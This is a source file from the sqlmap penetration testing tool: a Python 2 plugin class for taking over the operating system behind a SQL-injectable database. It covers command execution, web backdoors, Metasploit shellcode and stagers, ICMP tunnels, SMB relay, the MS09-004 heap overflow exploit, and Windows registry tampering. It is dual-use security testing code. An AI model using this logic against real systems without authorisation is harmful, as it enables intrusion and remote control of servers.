#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import os

from lib.core.common import readInput
from lib.core.common import runningAsAdmin
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.exception import sqlmapMissingDependence
from lib.core.exception import sqlmapMissingMandatoryOptionException
from lib.core.exception import sqlmapMissingPrivileges
from lib.core.exception import sqlmapNotVulnerableException
from lib.core.exception import sqlmapUndefinedMethod
from lib.core.exception import sqlmapUnsupportedDBMSException
from lib.takeover.abstraction import Abstraction
from lib.takeover.icmpsh import ICMPsh
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry

from plugins.generic.misc import Miscellaneous

class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName = "sqlmapoutput"
        self.tblField = "data"

        Abstraction.__init__(self)

    def osCmd(self):
        if kb.stackedTest or conf.direct:
            web = False
        elif not kb.stackedTest and kb.dbms == DBMS.MYSQL:
            infoMsg = "going to use a web backdoor for command execution"
            logger.info(infoMsg)

            web = True
        else:
            errMsg  = "unable to execute operating system commands via "
            errMsg += "the back-end DBMS"
            raise sqlmapNotVulnerableException(errMsg)

        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup()

    def osShell(self):
        if kb.stackedTest or conf.direct:
            web = False
        elif not kb.stackedTest and kb.dbms == DBMS.MYSQL:
            infoMsg = "going to use a web backdoor for command prompt"
            logger.info(infoMsg)

            web = True
        else:
            errMsg  = "unable to prompt for an interactive operating "
            errMsg += "system shell via the back-end DBMS"
            raise sqlmapNotVulnerableException(errMsg)

        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup()

    def osPwn(self):
        goUdf = False

        self.checkDbmsOs()

        msg  = "how do you want to establish the tunnel?"
        msg += "\n[1] TCP: Metasploit Framework (default)"
        msg += "\n[2] ICMP: icmpsh - ICMP tunneling"

        while True:
            tunnel = readInput(msg, default=1)

            if isinstance(tunnel, basestring) and tunnel.isdigit() and int(tunnel) in ( 1, 2 ):
                tunnel = int(tunnel)
                break

            elif isinstance(tunnel, int) and tunnel in ( 1, 2 ):
                break

            else:
                warnMsg = "invalid value, valid values are 1 and 2"
                logger.warn(warnMsg)

        if tunnel == 2 and kb.os != "Windows":
                errMsg = "icmpsh slave is only supported on Windows at "
                errMsg += "the moment. The back-end database server is "
                errMsg += "not. sqlmap will fallback to TCP (Metasploit)"
                logger.error(errMsg)

                tunnel = 1

        if tunnel == 2:
            isAdmin = runningAsAdmin()

            if isAdmin is not True:
                errMsg  = "you need to run sqlmap as an administrator "
                errMsg += "if you want to establish an out-of-band ICMP "
                errMsg += "tunnel because icmpsh uses raw sockets to "
                errMsg += "sniff and craft ICMP packets"
                raise sqlmapMissingPrivileges, errMsg

            try:
                from impacket import ImpactDecoder
                from impacket import ImpactPacket
            except ImportError, _:
                errMsg  = "sqlmap requires 'impacket' third-party library "
                errMsg += "in order to run icmpsh master. Download from "
                errMsg += "http://oss.coresecurity.com/projects/impacket.html"
                raise sqlmapMissingDependence, errMsg

            sysIgnoreIcmp = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

            if os.path.exists(sysIgnoreIcmp):
                fp = open(sysIgnoreIcmp, "wb")
                fp.write("1")
                fp.close()
            else:
                errMsg = "you need to disable ICMP replies by your machine "
                errMsg += "system-wide. For example run on Linux/Unix:\n"
                errMsg += "# sysctl -w net.ipv4.icmp_echo_ignore_all=1\n"
                errMsg += "If you miss doing that, you will receive "
                errMsg += "information from the database server and it "
                errMsg += "is unlikely to receive commands send from you"
                logger.error(errMsg)

            if kb.dbms in ( DBMS.MYSQL, DBMS.PGSQL ):
                self.sysUdfs.pop("sys_bineval")

        if kb.stackedTest or conf.direct:
            web = False

            self.getRemoteTempPath()
            self.initEnv(web=web)

            if tunnel == 1:
                if kb.dbms in ( DBMS.MYSQL, DBMS.PGSQL ):
                    msg  = "how do you want to execute the Metasploit shellcode "
                    msg += "on the back-end database underlying operating system?"
                    msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
                    msg += "\n[2] Stand-alone payload stager (file system way)"

                    while True:
                        choice = readInput(msg, default=1)

                        if isinstance(choice, basestring) and choice.isdigit() and int(choice) in ( 1, 2 ):
                            choice = int(choice)
                            break

                        elif isinstance(choice, int) and choice in ( 1, 2 ):
                            break

                        else:
                            warnMsg = "invalid value, valid values are 1 and 2"
                            logger.warn(warnMsg)

                    if choice == 1:
                        goUdf = True

                if goUdf:
                    self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
                else:
                    self.createMsfPayloadStager()
                    self.uploadMsfPayloadStager()

                if kb.os == "Windows" and conf.privEsc:
                    if kb.dbms == DBMS.MYSQL:
                        debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                        debugMsg += "user, no need to privilege escalate"
                        logger.debug(debugMsg)

                elif kb.os != "Windows" and conf.privEsc:
                    # Unset --priv-esc if the back-end DBMS underlying operating
                    # system is not Windows
                    conf.privEsc = False

                    warnMsg  = "sqlmap does not implement any operating system "
                    warnMsg += "user privilege escalation technique when the "
                    warnMsg += "back-end DBMS underlying system is not Windows"
                    logger.warn(warnMsg)
            elif tunnel == 2:
                self.uploadIcmpshSlave(web=web)
                self.icmpPwn()

        elif not kb.stackedTest and kb.dbms == DBMS.MYSQL:
            web = True

            infoMsg = "going to use a web backdoor to establish the tunnel"
            logger.info(infoMsg)

            self.initEnv(web=web)

            if self.webBackdoorUrl:
                if kb.os != "Windows" and conf.privEsc:
                    # Unset --priv-esc if the back-end DBMS underlying operating
                    # system is not Windows
                    conf.privEsc = False

                    warnMsg  = "sqlmap does not implement any operating system "
                    warnMsg += "user privilege escalation technique when the "
                    warnMsg += "back-end DBMS underlying system is not Windows"
                    logger.warn(warnMsg)

                self.getRemoteTempPath()

                if tunnel == 1:
                    self.createMsfPayloadStager()
                    self.uploadMsfPayloadStager(web=web)
                elif tunnel == 2:
                    self.uploadIcmpshSlave(web=web)
                    self.icmpPwn()
        else:
            errMsg  = "unable to prompt for an out-of-band session via "
            errMsg += "the back-end DBMS"
            raise sqlmapNotVulnerableException(errMsg)

        if tunnel == 1:
            if not web or (web and self.webBackdoorUrl is not None):
                self.pwn(goUdf)

        if not conf.cleanup:
            self.cleanup()

    def osSmb(self):
        self.checkDbmsOs()

        if kb.os != "Windows":
            errMsg  = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows: it is not possible to perform the SMB "
            errMsg += "relay attack"
            raise sqlmapUnsupportedDBMSException(errMsg)

        if not kb.stackedTest and not conf.direct:
            if kb.dbms in ( DBMS.PGSQL, DBMS.MSSQL ):
                errMsg  = "on this back-end DBMS it is only possible to "
                errMsg += "perform the SMB relay attack if stacked "
                errMsg += "queries are supported"
                raise sqlmapUnsupportedDBMSException(errMsg)

            elif kb.dbms == DBMS.MYSQL:
                debugMsg  = "since stacked queries are not supported, "
                debugMsg += "sqlmap is going to perform the SMB relay "
                debugMsg += "attack via inference blind SQL injection"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg   = "it is unlikely that this attack will be successful "

        if kb.dbms == DBMS.MYSQL:
            warnMsg += "because by default MySQL on Windows runs as "
            warnMsg += "Local System which is not a real user, it does "
            warnMsg += "not send the NTLM session hash when connecting to "
            warnMsg += "a SMB service"

        elif kb.dbms == DBMS.PGSQL:
            warnMsg += "because by default PostgreSQL on Windows runs "
            warnMsg += "as postgres user which is a real user of the "
            warnMsg += "system, but not within the Administrators group"

        elif kb.dbms == DBMS.MSSQL and kb.dbmsVersion[0] in ( "2005", "2008" ):
            warnMsg += "because often Microsoft SQL Server %s " % kb.dbmsVersion[0]
            warnMsg += "runs as Network Service which is not a real user, "
            warnMsg += "it does not send the NTLM session hash when "
            warnMsg += "connecting to a SMB service"

        else:
            printWarn = False

        if printWarn:
            logger.warn(warnMsg)

        self.smb()

    def osBof(self):
        if not kb.stackedTest and not conf.direct:
            return

        if not kb.dbms == DBMS.MSSQL or kb.dbmsVersion[0] not in ( "2000", "2005" ):
            errMsg  = "the back-end DBMS must be Microsoft SQL Server "
            errMsg += "2000 or 2005 to be able to exploit the heap-based "
            errMsg += "buffer overflow in the 'sp_replwritetovarbin' "
            errMsg += "stored procedure (MS09-004)"
            raise sqlmapUnsupportedDBMSException(errMsg)

        infoMsg  = "going to exploit the Microsoft SQL Server %s " % kb.dbmsVersion[0]
        infoMsg += "'sp_replwritetovarbin' stored procedure heap-based "
        infoMsg += "buffer overflow (MS09-004)"
        logger.info(infoMsg)

        self.initEnv(mandatory=False, detailed=True)
        self.getRemoteTempPath()
        self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
        self.bof()

    def uncPathRequest(self):
        errMsg  = "'uncPathRequest' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise sqlmapUndefinedMethod, errMsg

    def __regInit(self):
        if not kb.stackedTest and not conf.direct:
            return

        self.checkDbmsOs()

        if kb.os != "Windows":
            errMsg  = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows"
            raise sqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self.__regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
            msg     = "which registry key do you want to read? [%s] " % default
            regKey  = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg     = "which registry key value do you want to read? [%s] " % default
            regVal  = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "reading Windows registry path '%s\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self.__regInit()

        errMsg = "missing mandatory option"

        if not conf.regKey:
            msg    = "which registry key do you want to write? "
            regKey = readInput(msg)

            if not regKey:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg    = "which registry key value do you want to write? "
            regVal = readInput(msg)

            if not regVal:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg     = "which registry key value data do you want to write? "
            regData = readInput(msg)

            if not regData:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg     = "which registry key value data-type is it? "
            msg    += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg  = "adding Windows registry path '%s\%s' " % (regKey, regVal)
        infoMsg += "with data '%s'. " % regData
        infoMsg += "This will work only if the user running the database "
        infoMsg += "process has privileges to modify the Windows registry."
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self.__regInit()

        errMsg = "missing mandatory option"

        if not conf.regKey:
            msg    = "which registry key do you want to delete? "
            regKey = readInput(msg)

            if not regKey:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg    = "which registry key value do you want to delete? "
            regVal = readInput(msg)

            if not regVal:
                raise sqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message  = "are you sure that you want to delete the Windows "
        message += "registry path '%s\%s? [y/N] " % (regKey, regVal)
        output   = readInput(message, default="N")

        if output and output[0] not in ( "Y", "y" ):
            return

        infoMsg  = "deleting Windows registry path '%s\%s'. " % (regKey, regVal)
        infoMsg += "This will work only if the user running the database "
        infoMsg += "process has privileges to modify the Windows registry."
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
